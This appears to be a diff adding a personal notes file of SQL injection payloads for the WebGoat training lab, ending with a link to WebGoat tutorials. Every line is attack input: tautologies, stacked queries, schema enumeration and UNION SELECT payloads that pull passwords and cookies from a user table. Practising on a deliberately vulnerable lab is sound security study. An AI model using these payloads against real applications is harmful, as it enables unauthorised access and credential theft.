@@ -1,0 +1,20 @@
+' or 1=1 --
+
+1234567 or 1=1
+
+usuario'; select *from user_system_data;--
+
+';SELECT * FROM INFORMATION_SCHEMA.COLUMNS;--
+usuario'; select first_name last_name from user_data union all select user_name password from user_system_data;--
+
+usuario' or 1=1 union select *from user_system_data;--
+
+usuario' or '1'=1 union select userid, password, password, password,
+password, password, password from user_system_data'
+
+usuario' union all select userid, password, password, password, 
+password, password, password from user_system_data'
+
+Snow' union select cast(userid as int), user_name, password, cookie, NULL, NULL, 1 from user_system_data --
+
+http://webappsecmovies.sourceforge.net/webgoat/#Injection_Flaws
